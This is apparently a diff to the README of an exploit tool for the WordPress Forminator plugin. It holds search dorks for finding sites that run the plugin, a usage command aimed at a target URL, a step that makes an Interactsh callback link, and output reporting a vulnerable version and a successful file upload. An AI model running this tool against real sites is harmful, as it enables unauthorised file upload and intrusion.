@@ -22,10 +22,12 @@ http.html:"/wp-content/plugins/forminator"
 body="/wp-content/plugins/forminator"
 ```
 ### Usage
+Generate [Interactsh link](https://app.interactsh.com/#/)
 ```
-python3 exploit.py -v -u https://target-IP/?p=7
+python3 exploit.py -u https://target-IP/?p=7
 ```
 ```
+Input interactsh link: ckr8x142vtc0000kbk9ggjhrqowyyyyyb.oast.fun
   [+] Vulnerable version found: 1.24.6
   [+] Sending payload to target
   [+] Successful file upload!
